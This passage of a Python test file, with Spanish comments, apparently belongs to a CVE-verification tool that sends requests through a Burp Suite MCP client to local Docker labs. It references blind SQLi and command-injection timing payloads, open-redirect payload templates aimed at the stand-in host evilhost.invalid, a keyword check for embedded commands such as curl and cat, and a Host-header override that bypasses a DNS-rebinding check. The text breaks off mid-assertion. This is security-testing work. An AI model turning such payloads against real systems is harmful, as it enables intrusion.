    assert res.status_code == 200
    assert res.text == "hello world"


def test_burpmcp_build_raw_http1_request_sets_content_length():
    from binoracle.workflows.burpmcp import _build_raw_http1_request
    raw = _build_raw_http1_request("POST", "/x", "example.com", {}, "a=1")
    assert "POST /x HTTP/1.1" in raw
    assert "Host: example.com" in raw
    assert "Content-Length: 3" in raw
    assert raw.endswith("a=1")


def test_burpmcp_client_find_tool_requires_connection(tmp_path):
    from binoracle.workflows.burpmcp import BurpMCPClient, BurpMCPError
    client = BurpMCPClient("http://127.0.0.1:1/sse")
    with pytest.raises(BurpMCPError):
        client.call_tool("whatever", {})


@pytest.mark.skipif(
    __import__("importlib").util.find_spec("mcp") is None
    or __import__("importlib").util.find_spec("uvicorn") is None,
    reason="requiere los paquetes 'mcp' y 'uvicorn' (servidor MCP de mentira para el test en vivo)")
def test_burpmcp_client_round_trip_against_mock_server():
    # prueba dura de verdad (no mockeada por dentro): un servidor MCP real (mismo SDK que usaria
    # la extension de Burp) expone una tool 'send_http1_request' con la MISMA forma que la
    # extension oficial (confirmado via WebFetch de su codigo fuente), y BurpMCPClient/
    # BurpHttpTransport tienen que descubrirla por nombre, construir la peticion HTTP/1.1 cruda,
    # mandarla, y parsear la respuesta cruda de vuelta -- de principio a fin, sin research no se
    # puede probar contra el Burp real de la usuaria desde este sandbox.
    import socket
    import subprocess
    import sys
    import threading
    import time
    from http.server import BaseHTTPRequestHandler, HTTPServer

    from binoracle.workflows.burpmcp import BurpHttpTransport, BurpMCPClient

    class _EchoHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            from urllib.parse import parse_qs, urlsplit
            qs = parse_qs(urlsplit(self.path).query)
            name = (qs.get("name") or [""])[0]
            body = f"hello {name}".encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    def free_port():
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        p = s.getsockname()[1]
        s.close()
        return p

    target_port = free_port()
    target_server = HTTPServer(("127.0.0.1", target_port), _EchoHandler)
    target_thread = threading.Thread(target=target_server.serve_forever, daemon=True)
    target_thread.start()

    mcp_port = free_port()
    server_code = f'''
import socket
from mcp.server.mcpserver import MCPServer
mcp = MCPServer("test-mock-burp")

@mcp.tool()
def send_http1_request(content: str, targetHostname: str, targetPort: int, usesHttps: bool) -> str:
    sock = socket.create_connection((targetHostname, targetPort), timeout=10)
    try:
        sock.sendall(content.encode("utf-8", errors="replace"))
        chunks = []
        sock.settimeout(5)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()

import uvicorn
uvicorn.run(mcp.sse_app(), host="127.0.0.1", port={mcp_port}, log_level="warning")
'''
    proc = subprocess.Popen([sys.executable, "-c", server_code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(2)
        client = BurpMCPClient(f"http://127.0.0.1:{mcp_port}/sse", timeout=15.0)
        client.connect()
        try:
            assert "send_http1_request" in client.tools
            assert client.find_tool("send", "http1", "request") == "send_http1_request"
            transport = BurpHttpTransport(client)
            resp = transport.request("GET", f"http://127.0.0.1:{target_port}/echo",
                                     params={"name": "burp-mcp-test"})
            assert resp.status_code == 200
            assert resp.text == "hello burp-mcp-test"
        finally:
            client.close()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
        target_server.shutdown()


def test_burpmcp_call_tool_uses_connect_timeout_when_no_per_call_timeout_given(monkeypatch):
    from binoracle.workflows.burpmcp import BurpMCPClient

    client = BurpMCPClient("http://127.0.0.1:1", timeout=20.0)
    client._loop = object()  # basta para pasar el chequeo de "conectado"

    captured = {}

    def fake_run_coroutine_threadsafe(coro, loop):
        coro.close()  # evita el warning de "coroutine never awaited"
        class _Fut:
            def result(self_, t):
                captured["timeout"] = t
                return "ok"
        return _Fut()

    monkeypatch.setattr("asyncio.run_coroutine_threadsafe", fake_run_coroutine_threadsafe)
    client.call_tool("some_tool", {})
    assert captured["timeout"] == 20.0


def test_burpmcp_call_tool_uses_per_call_timeout_over_connect_timeout(monkeypatch):
    # bug real confirmado en vivo: command-injection/SQLi blind-timing mandan un SLEEP(6) con
    # timeout=21 esperado -- si call_tool() siempre usara self.timeout (el de CONEXION a Burp,
    # 20s por defecto), la respuesta se cortaria antes de que el sleep inyectado terminase y la
    # tecnica de deteccion por temporizacion nunca veria el retraso real.
    from binoracle.workflows.burpmcp import BurpMCPClient

    client = BurpMCPClient("http://127.0.0.1:1", timeout=20.0)
    client._loop = object()

    captured = {}

    def fake_run_coroutine_threadsafe(coro, loop):
        coro.close()
        class _Fut:
            def result(self_, t):
                captured["timeout"] = t
                return "ok"
        return _Fut()

    monkeypatch.setattr("asyncio.run_coroutine_threadsafe", fake_run_coroutine_threadsafe)
    client.call_tool("some_tool", {}, timeout=31.0)
    assert captured["timeout"] == 31.0


@pytest.mark.skipif(
    __import__("importlib").util.find_spec("mcp") is None
    or __import__("importlib").util.find_spec("uvicorn") is None,
    reason="requiere los paquetes 'mcp' y 'uvicorn' (servidor MCP de mentira para el test en vivo)")
def test_burpmcp_transport_forwards_request_timeout_past_connect_timeout():
    # prueba dura de verdad (no mockeada por dentro): una tool MCP real que tarda mas que el
    # timeout de CONEXION a Burp (self.client.timeout) antes de responder -- si
    # BurpHttpTransport.request() no reenviara su propio `timeout` a call_tool(), esta
    # respuesta se cortaria con un TimeoutError exactamente como le paso a la usuaria con el
    # blind command injection por temporizacion.
    import socket
    import subprocess
    import sys
    import threading
    import time
    from http.server import BaseHTTPRequestHandler, HTTPServer

    from binoracle.workflows.burpmcp import BurpHttpTransport, BurpMCPClient

    class _SlowHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            time.sleep(6)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"slow-ok")

        def log_message(self, *a):
            pass

    def free_port():
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        p = s.getsockname()[1]
        s.close()
        return p

    target_port = free_port()
    target_server = HTTPServer(("127.0.0.1", target_port), _SlowHandler)
    target_thread = threading.Thread(target=target_server.serve_forever, daemon=True)
    target_thread.start()

    mcp_port = free_port()
    server_code = f'''
import socket
from mcp.server.mcpserver import MCPServer
mcp = MCPServer("test-mock-burp-slow")

@mcp.tool()
def send_http1_request(content: str, targetHostname: str, targetPort: int, usesHttps: bool) -> str:
    sock = socket.create_connection((targetHostname, targetPort), timeout=20)
    try:
        sock.sendall(content.encode("utf-8", errors="replace"))
        chunks = []
        sock.settimeout(15)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()

import uvicorn
uvicorn.run(mcp.sse_app(), host="127.0.0.1", port={mcp_port}, log_level="warning")
'''
    proc = subprocess.Popen([sys.executable, "-c", server_code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(2)
        # timeout de CONEXION a Burp deliberadamente corto (5s) -- si request() no reenviara su
        # propio timeout (20s, de sobra para los 6s que tarda el handler) y usara este en su
        # lugar, la llamada fallaria con un TimeoutError bastante antes de los 6s reales.
        client = BurpMCPClient(f"http://127.0.0.1:{mcp_port}/sse", timeout=5.0)
        client.connect()
        try:
            transport = BurpHttpTransport(client)
            resp = transport.request("GET", f"http://127.0.0.1:{target_port}/slow", timeout=20.0)
            assert resp.status_code == 200
            assert resp.text == "slow-ok"
        finally:
            client.close()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
        target_server.shutdown()


@pytest.mark.skipif(
    __import__("importlib").util.find_spec("mcp") is None
    or __import__("importlib").util.find_spec("uvicorn") is None,
    reason="requiere los paquetes 'mcp' y 'uvicorn' (servidor MCP de mentira para el test en vivo)")
def test_burpmcp_transport_translates_host_docker_internal_to_127_for_burps_own_connection():
    # bug real confirmado en vivo: un laboratorio Docker efimero (wpverify.py/genericverify.py)
    # construye su base_url con host.docker.internal porque es BINORACLE, corriendo DENTRO de
    # un contenedor, quien necesita esa direccion para alcanzar el puerto publicado -- pero
    # quien hace la conexion TCP real cuando Burp esta configurado es BURP, corriendo NATIVO en
    # el host, y host.docker.internal NO resuelve para un proceso normal del sistema operativo
    # del host (solo lo inyecta Docker Desktop dentro de los contenedores). Sin la traduccion,
    # TODA peticion de ataque/login contra un laboratorio efimero fallaba en cuanto Burp estaba
    # configurado. Esta prueba, igual que test_burpmcp_client_round_trip_against_mock_server,
    # usa una tool MCP real que hace la conexion TCP de verdad -- si "host.docker.internal" no
    # se tradujera a 127.0.0.1 antes de pedirle a esa tool que conecte, esta prueba fallaria con
    # un error de resolucion DNS exactamente como le paso a la usuaria en su Mac.
    import socket
    import subprocess
    import sys
    import threading
    import time
    from http.server import BaseHTTPRequestHandler, HTTPServer

    from binoracle.workflows.burpmcp import BurpHttpTransport, BurpMCPClient

    class _EchoHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok-from-lab")

        def log_message(self, *a):
            pass

    def free_port():
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        p = s.getsockname()[1]
        s.close()
        return p

    target_port = free_port()
    target_server = HTTPServer(("127.0.0.1", target_port), _EchoHandler)
    target_thread = threading.Thread(target=target_server.serve_forever, daemon=True)
    target_thread.start()

    mcp_port = free_port()
    server_code = f'''
import socket
from mcp.server.mcpserver import MCPServer
mcp = MCPServer("test-mock-burp-dns")

@mcp.tool()
def send_http1_request(content: str, targetHostname: str, targetPort: int, usesHttps: bool) -> str:
    sock = socket.create_connection((targetHostname, targetPort), timeout=10)
    try:
        sock.sendall(content.encode("utf-8", errors="replace"))
        chunks = []
        sock.settimeout(5)
        try:
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks).decode("utf-8", errors="replace")
    finally:
        sock.close()

import uvicorn
uvicorn.run(mcp.sse_app(), host="127.0.0.1", port={mcp_port}, log_level="warning")
'''
    proc = subprocess.Popen([sys.executable, "-c", server_code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(2)
        client = BurpMCPClient(f"http://127.0.0.1:{mcp_port}/sse", timeout=15.0)
        client.connect()
        try:
            transport = BurpHttpTransport(client)
            # si "host.docker.internal" no se tradujera, create_connection fallaria con un
            # error de resolucion DNS (no existe ese nombre fuera de un contenedor) y esta
            # llamada lanzaria, igual que le fallaba el login a la usuaria con Burp activo.
            resp = transport.request(
                "GET", f"http://host.docker.internal:{target_port}/wp-login.php")
            assert resp.status_code == 200
            assert resp.text == "ok-from-lab"
        finally:
            client.close()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()
        target_server.shutdown()


def test_genericverify_http_request_falls_back_to_requests_without_burp(monkeypatch, tmp_path):
    import binoracle.workflows.genericverify as gv
    gv._burp_transport = None
    assert gv._http_request is not None  # el indirect existe y no rompe sin Burp configurado


def test_burpmcp_parse_raw_http_response_preserves_multiple_set_cookie_headers():
    # el bug real que se encontro: dict(msg.items()) colapsa cabeceras repetidas a la ULTIMA --
    # una respuesta de login tipica manda VARIAS Set-Cookie, y antes del fix se perdian todas
    # menos una.
    from binoracle.workflows.burpmcp import _parse_raw_http_response
    raw = ("HTTP/1.1 302 Found\r\nSet-Cookie: sessionid=abc; Path=/\r\n"
          "Set-Cookie: other=extra; Path=/\r\nLocation: /whoami\r\n\r\n")
    res = _parse_raw_http_response(raw)
    assert res.set_cookie_headers == ["sessionid=abc; Path=/", "other=extra; Path=/"]
    assert res.headers.get("Location") == "/whoami"


def test_burpmcp_session_persists_cookies_across_requests(monkeypatch):
    from binoracle.workflows.burpmcp import BurpMCPResponse, BurpSession

    class _FakeTransport:
        def __init__(self):
            self.sent_headers = []

        def request(self, method, url, params=None, data=None, headers=None, timeout=20.0,
                   allow_redirects=True, **kw):
            self.sent_headers.append(dict(headers or {}))
            if url.endswith("/login"):
                return BurpMCPResponse(status_code=302,
                                       set_cookie_headers=["sessionid=tok123; Path=/",
                                                           "other=extra; Path=/"])
            return BurpMCPResponse(status_code=200, text="ok")

    session = BurpSession.__new__(BurpSession)
    session.client = None
    session._transport = _FakeTransport()
    session._cookie_values = {}

    session.post("http://x/login", data={"user": "a"})
    assert {c.name: c.value for c in session.cookies} == {"sessionid": "tok123", "other": "extra"}

    session.get("http://x/whoami")
    sent = session._transport.sent_headers[-1]
    assert sent.get("Cookie") in ("sessionid=tok123; other=extra", "other=extra; sessionid=tok123")


def test_burpmcp_session_cookies_adapter_supports_get_and_iteration():
    from binoracle.workflows.burpmcp import _CookieJarAdapter
    adapter = _CookieJarAdapter({"a": "1", "b": "2"})
    assert adapter.get("a") == "1"
    assert adapter.get("missing") is None
    assert {c.name: c.value for c in adapter} == {"a": "1", "b": "2"}


def test_wpverify_make_session_returns_requests_session_without_burp(monkeypatch):
    import binoracle.workflows.wpverify as wv
    monkeypatch.setattr(wv, "_burp_client", None)
    s = wv._make_session()
    import requests
    assert isinstance(s, requests.Session)


def test_wpverify_make_session_returns_burp_session_when_configured(monkeypatch):
    import binoracle.workflows.wpverify as wv
    fake_client = object()
    monkeypatch.setattr(wv, "_burp_client", fake_client)

    class _FakeBurpSession:
        def __init__(self, client):
            self.client = client

    import binoracle.workflows.burpmcp as burpmcp
    monkeypatch.setattr(burpmcp, "BurpSession", _FakeBurpSession)
    s = wv._make_session()
    assert isinstance(s, _FakeBurpSession)
    assert s.client is fake_client


def test_drupalverify_and_joomlaverify_login_never_use_burp():
    # el laboratorio efimero (WordPress/Drupal/Joomla) NUNCA debe enrutar su propio login por
    # Burp, aunque --burp-mcp-url este configurado -- enrutarlo causo dos bugs reales distintos
    # confirmados en vivo (ver test_lab_host_never_changes_for_burp_and_lab_logins_never_use_burp
    # en wpverify.py). _drupal_login/_joomla_login deben usar requests.Session() DIRECTAMENTE, no
    # el _make_session() compartido (que SI puede ir por Burp, para los verificadores genericos).
    import inspect
    from binoracle.workflows import drupalverify, joomlaverify
    assert "s = requests.Session()" in inspect.getsource(drupalverify._drupal_login)
    assert "s = requests.Session()" in inspect.getsource(joomlaverify._joomla_login)
    assert "s = _make_session()" not in inspect.getsource(drupalverify._drupal_login)
    assert "s = _make_session()" not in inspect.getsource(joomlaverify._joomla_login)


def test_payload_kb_load_command_injection_separators_pure_only():
    from binoracle.workflows import payload_kb
    seps = payload_kb.load_command_injection_separators()
    assert len(seps) >= 10
    assert "&" in seps
    assert ";" in seps
    # ninguna linea con un comando real incrustado (dir/id/cat/curl...) debe colarse
    assert not any("id" in s or "dir" in s or "cat" in s or "curl" in s for s in seps)


def test_payload_kb_load_open_redirect_templates_substitutes_host_and_dedupes():
    from binoracle.workflows import payload_kb
    templates = payload_kb.load_open_redirect_templates("evilhost.invalid")
    assert len(templates) > 100
    assert all("evilhost.invalid" in t for t in templates)
    assert all("google.com" not in t and "example.com" not in t and "whitelisteddomain.tld" not in t
              for t in templates)
    assert len(templates) == len(set(templates))


def test_payload_kb_load_open_redirect_templates_skips_multi_param_queries():
    from binoracle.workflows import payload_kb
    templates = payload_kb.load_open_redirect_templates("evilhost.invalid")
    assert not any("?" in t or "&" in t for t in templates)


# --- endurecido tras un fallo real en vivo: Dockerfile sin 'mcp' instalado, y el LLM sin dar
# source_url para un CVE de WordPress cuyo nombre de plugin SI estaba en la descripcion ---

def test_guess_wp_slug_from_description_patchstack_format():
    from binoracle.workflows.cve_agent import _guess_wp_slug_from_description
    desc = ("Improper Neutralization of Special Elements used in an SQL Command ('SQL "
           "Injection') vulnerability in ValvePress Automatic allows SQL Injection.This issue "
           "affects Automatic: from n/a through 3.92.0.")
    assert _guess_wp_slug_from_description(desc) == "automatic"


def test_guess_wp_slug_from_description_multiword_plugin_name():
    from binoracle.workflows.cve_agent import _guess_wp_slug_from_description
    desc = ("Cross-Site Request Forgery (CSRF) vulnerability in John Doe Contact Form 7 "
           "Extended allows Stored XSS.This issue affects Contact Form 7 Extended: from n/a "
           "through 1.2.3.")
    assert _guess_wp_slug_from_description(desc) == "contact-form-7-extended"


def test_guess_wp_slug_from_description_wordpress_plugin_phrasing():
    from binoracle.workflows.cve_agent import _guess_wp_slug_from_description
    desc = "A vulnerability was found in the Example Gallery WordPress plugin before 3.1."
    assert _guess_wp_slug_from_description(desc) == "example-gallery"


def test_guess_wp_slug_from_description_the_x_wordpress_plugin_before_phrasing():
    # bug real confirmado en vivo (CVE-2024-3552): "The Web Directory Free WordPress plugin
    # before 1.7.0 does not sanitise..." -- sin "in the"/"vulnerability in"/"This issue affects",
    # un fraseo distinto muy comun en WPScan/Patchstack que los patrones anteriores no cubrian.
    from binoracle.workflows.cve_agent import _guess_wp_slug_from_description
    desc = ("The Web Directory Free WordPress plugin before 1.7.0 does not sanitise and escape "
            "a parameter before using it in a SQL statement via an AJAX action available to "
            "unauthenticated users.")
    assert _guess_wp_slug_from_description(desc) == "web-directory-free"


def test_guess_wp_slug_from_description_returns_none_without_recognizable_pattern():
    from binoracle.workflows.cve_agent import _guess_wp_slug_from_description
    assert _guess_wp_slug_from_description("Generic text with no plugin name pattern.") is None
    assert _guess_wp_slug_from_description("") is None
    assert _guess_wp_slug_from_description(None) is None


def test_run_web_investigation_falls_back_to_guessed_slug_when_llm_gives_none(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource

    called = {}
    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        called["source"] = target
        return websource.SourceFetchResult(ok=False, kind="wordpress-plugin", source=target,
                                           note="404 (slug de prueba, no existe de verdad)")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    inv = Investigation(cve_id="CVE-2024-27956")
    inv.vuln_class = "sqli"
    inv.description = ("Improper Neutralization... vulnerability in ValvePress Automatic "
                       "allows SQL Injection.This issue affects Automatic: from n/a through "
                       "3.92.0.")
    inv.llm_notes = {"vuln_class": "sqli"}  # SIN source_url -- el caso real que fallo
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("source") == "automatic"
    assert inv.source_fetch["source_guessed_from_description"] is True
    assert any("automatic" in b for b in inv.blockers)


# --- endurecido tras un segundo fallo real en vivo: Burp bloquea la conexion con "Blocked DNS
# rebinding attack from host: host.docker.internal:9876" cuando binoracle corre en Docker ---

def test_burpmcp_client_overrides_host_header_for_non_localhost_url():
    from binoracle.workflows.burpmcp import BurpMCPClient
    client = BurpMCPClient("http://host.docker.internal:9876")
    assert client.host_header == "127.0.0.1:9876"


def test_burpmcp_client_no_override_for_localhost_url():
    from binoracle.workflows.burpmcp import BurpMCPClient
    assert BurpMCPClient("http://127.0.0.1:9876").host_header is None
    assert BurpMCPClient("http://localhost:9876").host_header is None


def test_burpmcp_client_custom_host_header_override():
    from binoracle.workflows.burpmcp import BurpMCPClient
    client = BurpMCPClient("http://host.docker.internal:1234/sse", host_header="127.0.0.1:9999")
    assert client.host_header == "127.0.0.1:9999"


def test_burpmcp_client_default_port_in_host_header_without_explicit_port():
    from binoracle.workflows.burpmcp import BurpMCPClient
    client = BurpMCPClient("http://host.docker.internal/sse")
    assert client.host_header == "127.0.0.1:9876"


def test_burpmcp_client_default_sse_read_timeout_is_generous():
    # confirmado en vivo: con el default de sse_client() (300s) una investigacion real tumbaba
    # el stream SSE a mitad de camino (ReadTimeout) mientras binoracle construia el laboratorio
    # Docker efimero sin mandar nada por Burp durante ese rato -- el default de BurpMCPClient
    # tiene que ser muchisimo mas generoso que eso.
    from binoracle.workflows.burpmcp import BurpMCPClient
    client = BurpMCPClient("http://127.0.0.1:9876")
    assert client.sse_read_timeout >= 3600.0


@pytest.mark.skipif(__import__("importlib").util.find_spec("mcp") is None,
    reason="requiere el paquete 'mcp'")
def test_burpmcp_client_forwards_sse_read_timeout_to_sse_client(monkeypatch):
    import mcp.client.sse as sse_mod
    from binoracle.workflows.burpmcp import BurpMCPClient

    captured = {}

    class _FakeCM:
        async def __aenter__(self):
            raise RuntimeError("stop-before-real-connect")

        async def __aexit__(self, *a):
            return False

    def fake_sse_client(url, headers=None, sse_read_timeout=None, **kw):
        captured["sse_read_timeout"] = sse_read_timeout
        return _FakeCM()

    monkeypatch.setattr(sse_mod, "sse_client", fake_sse_client)

    client = BurpMCPClient("http://127.0.0.1:1", timeout=2.0, sse_read_timeout=1234.0)
    try:
        client.connect()
    except Exception:
        pass
    client.close()
    assert captured.get("sse_read_timeout") == 1234.0



@pytest.mark.skipif(
    __import__("importlib").util.find_spec("mcp") is None
    or __import__("importlib").util.find_spec("uvicorn") is None,
    reason="requiere los paquetes 'mcp' y 'uvicorn'")
def test_burpmcp_client_host_header_override_defeats_dns_rebinding_check():
    # reproduce EXACTAMENTE el fallo real: Burp rechazo la conexion con 403 "Blocked DNS
    # rebinding attack from host: host.docker.internal:9876" (mensaje real, visto en vivo) --
    # aqui un servidor de mentira implementa la MISMA proteccion (rechaza cualquier Host header
    # que no sea 127.0.0.1/localhost), y se conecta via '2130706433' (127.0.0.1 en decimal: una
    # forma de IP que el resolver del SO resuelve a loopback sin DNS externo ni tocar /etc/hosts,
    # pero cuyo string NO es literalmente '127.0.0.1' -- dispara el mismo override que
    # host.docker.internal). BurpMCPClient tiene que seguir conectando.
    import socket
    import subprocess
    import sys
    import time

    from binoracle.workflows.burpmcp import BurpMCPClient

    def free_port():
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        p = s.getsockname()[1]
        s.close()
        return p

    mcp_port = free_port()
    server_code = f'''
from mcp.server.mcpserver import MCPServer
mcp = MCPServer("test-hostcheck")

@mcp.tool()
def send_http1_request(content: str, targetHostname: str, targetPort: int, usesHttps: bool) -> str:
    return "HTTP/1.1 200 OK\\r\\n\\r\\nok"

class HostCheckMiddleware:
    def __init__(self, app):
        self.app = app
    async def __call__(self, scope, receive, send):
        if scope["type"] == "http":
            headers = dict(scope.get("headers") or [])
            host = headers.get(b"host", b"").decode()
            if not (host.startswith("127.0.0.1") or host.startswith("localhost")):
                await send({{"type": "http.response.start", "status": 403, "headers": []}})
                await send({{"type": "http.response.body",
                           "body": f"Blocked DNS rebinding attack from host: {{host}}".encode()}})
                return
        await self.app(scope, receive, send)

import uvicorn
uvicorn.run(HostCheckMiddleware(mcp.sse_app()), host="0.0.0.0", port={mcp_port}, log_level="warning")
'''
    proc = subprocess.Popen([sys.executable, "-c", server_code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(2)
        client = BurpMCPClient(f"http://2130706433:{mcp_port}/sse", timeout=10.0)
        assert client.host_header == f"127.0.0.1:{mcp_port}"
        client.connect()
        try:
            assert "send_http1_request" in client.tools
        finally:
            client.close()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


# --- endurecido tras un cuarto fallo real en vivo: 'affected_version' llego como la frase libre
# de la descripcion del CVE ('from n/a through 3.92.0') y se colo tal cual en la URL de
# descarga, rompiendola (espacio -> "URL can't contain control characters") ---

def test_websource_looks_like_version_accepts_real_versions():
    from binoracle.workflows.websource import _looks_like_version
    assert _looks_like_version("3.92.0") is True
    assert _looks_like_version("5.1.8") is True
    assert _looks_like_version("1.0-beta1") is True


def test_websource_looks_like_version_rejects_free_text():
    from binoracle.workflows.websource import _looks_like_version
    assert _looks_like_version("from n/a through 3.92.0") is False
    assert _looks_like_version("n/a") is False
    assert _looks_like_version("") is False


def test_websource_fetch_wordpress_plugin_ignores_garbage_version(monkeypatch):
    from binoracle.workflows import websource

    called = {}
    def fake_download(slug, url, resolved_version, dest_dir, step, timeout, res):
        called["url"] = url
        called["resolved_version"] = resolved_version
        res.ok = True
        return res
    monkeypatch.setattr(websource, "_download_wp_zip", fake_download)

    def fake_urlopen(url, timeout=60.0):
        raise OSError("simulated 404")
    monkeypatch.setattr(websource, "_urlopen", fake_urlopen)

    res = websource.fetch_wordpress_plugin("automatic", version="from n/a through 3.92.0")
    # la version con pinta de frase libre se ignora ANTES de construir la URL -- nunca debe
    # contener un espacio (lo que rompia la peticion real).
    assert "from n/a through" not in called.get("url", "")
    assert " " not in called.get("url", "")


def test_clean_affected_version_extracts_from_patchstack_phrasing():
    from binoracle.workflows.cve_agent import _clean_affected_version
    assert _clean_affected_version("from n/a through 3.92.0") == "3.92.0"
    assert _clean_affected_version("5.1.8") == "5.1.8"
    assert _clean_affected_version("") == ""
    assert _clean_affected_version("no version info here") == ""


def test_run_web_investigation_cleans_version_before_fetching(monkeypatch, tmp_path):
    from binoracle.workflows.cve_agent import Investigation, _run_web_investigation
    from binoracle.workflows import websource

    called = {}
    def fake_fetch_source(target, version="", on_step=None, timeout=90.0, cms_hint="",
                          exclusive_upper_bound=False):
        called["source"] = target
        called["version"] = version
        return websource.SourceFetchResult(ok=False, kind="wordpress-plugin", source=target,
                                           note="404 (prueba)")
    monkeypatch.setattr(websource, "fetch_source", fake_fetch_source)

    inv = Investigation(cve_id="CVE-2024-27956")
    inv.vuln_class = "sqli"
    inv.description = "vulnerability in ValvePress Automatic allows SQLi.This issue affects Automatic: from n/a through 3.92.0."
    inv.llm_notes = {"vuln_class": "sqli", "source_url": "automatic",
                     "affected_version": "from n/a through 3.92.0"}
    _run_web_investigation(inv, lang="es", step=lambda m: None)
    assert called.get("version") == "3.92.0"


@pytest.mark.skipif(
    __import__("importlib").util.find_spec("mcp") is None
    or __import__("importlib").util.find_spec("uvicorn") is None,
    reason="requiere los paquetes 'mcp' y 'uvicorn'")
def test_burpmcp_client_retries_without_sse_suffix_on_404():
    # reproduce el fallo real que la usuaria siguio pegando: escribe --burp-mcp-url con '/sse'
    # al final (una convencion de OTROS servidores MCP, no de la extension real de Burp, que
    # monta en la raiz) -- en vez de obligarla a acordarse de nunca escribirlo, el cliente
    # reintenta solo sin el sufijo cuando el primer intento da 404.
    import socket
    import subprocess
    import sys
    import time

    from binoracle.workflows.burpmcp import BurpMCPClient

    def free_port():
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        p = s.getsockname()[1]
        s.close()
        return p

    mcp_port = free_port()
    server_code = f'''
from mcp.server.mcpserver import MCPServer
mcp = MCPServer("test-root-only")

@mcp.tool()
def send_http1_request(content: str, targetHostname: str, targetPort: int, usesHttps: bool) -> str:
    return "HTTP/1.1 200 OK\\r\\n\\r\\nok"

import uvicorn
uvicorn.run(mcp.sse_app(sse_path="/"), host="127.0.0.1", port={mcp_port}, log_level="warning")
'''
    proc = subprocess.Popen([sys.executable, "-c", server_code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(2)
        client = BurpMCPClient(f"http://127.0.0.1:{mcp_port}/sse", timeout=10.0)
        client.connect()
        try:
            assert client.sse_url == f"http://127.0.0.1:{mcp_port}"
            assert "send_http1_request" in client.tools
        finally:
            client.close()
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


def test_burpmcp_client_does_not_strip_sse_suffix_on_non_404_error():
    from binoracle.workflows.burpmcp import BurpMCPClient, BurpMCPError
    # un error que NO es 404 (p.ej. conexion rechazada porque Burp no esta corriendo) no debe
    # disparar el reintento -- solo el 404 especifico de 'la ruta /sse no existe'.
    client = BurpMCPClient("http://127.0.0.1:1/sse", timeout=2.0)
    with pytest.raises(BurpMCPError):
        client.connect()
    assert client.sse_url == "http://127.0.0.1:1/sse"


# --- endurecido tras un sexto fallo real en vivo: el LLM dio source_url como la URL de la
# PAGINA del plugin (https://wordpress.org/plugins/ultimate-member/), no el slug desnudo, y
# fetch_source() la rechazo entera en vez de extraer el slug ---

def test_extract_wp_org_plugin_slug_from_page_url():
    from binoracle.workflows.websource import _extract_wp_org_plugin_slug
    assert _extract_wp_org_plugin_slug("https://wordpress.org/plugins/ultimate-member/") == "ultimate-member"
    assert _extract_wp_org_plugin_slug("https://wordpress.org/plugins/ultimate-member") == "ultimate-member"
    assert _extract_wp_org_plugin_slug("https://www.wordpress.org/plugins/foo-bar/?x=1") == "foo-bar"
    assert _extract_wp_org_plugin_slug("automatic") is None
    assert _extract_wp_org_plugin_slug("https://example.com/plugins/foo/") is None


def test_extract_drupal_org_module_slug_from_page_url():
    from binoracle.workflows.websource import _extract_drupal_org_module_slug
    assert _extract_drupal_org_module_slug("https://www.drupal.org/project/webform") == "webform"
    assert _extract_drupal_org_module_slug("https://drupal.org/project/webform/releases") == "webform"
    assert _extract_drupal_org_module_slug("webform") is None


def test_extract_wp_trac_plugin_slug_from_changeset_browser_and_log_urls():
    # bug real confirmado en vivo (CVE-2024-1071): NVD referencia a menudo el changeset Trac
    # que parcheo la CVE (es literalmente el parche), y el LLM a veces trae esa URL como
    # source_url en vez de la pagina del directorio o el slug desnudo.
    from binoracle.workflows.websource import _extract_wp_trac_plugin_slug
    assert _extract_wp_trac_plugin_slug(
        "https://plugins.trac.wordpress.org/changeset/5678901/ultimate-member/trunk/") == "ultimate-member"
    assert _extract_wp_trac_plugin_slug(
        "https://plugins.trac.wordpress.org/browser/ultimate-member/trunk/ultimate-member.php"
    ) == "ultimate-member"
    assert _extract_wp_trac_plugin_slug("https://plugins.trac.wordpress.org/log/ultimate-member/") == "ultimate-member"
    assert _extract_wp_trac_plugin_slug("plugins.trac.wordpress.org/changeset/123/foo-bar") == "foo-bar"
    assert _extract_wp_trac_plugin_slug(
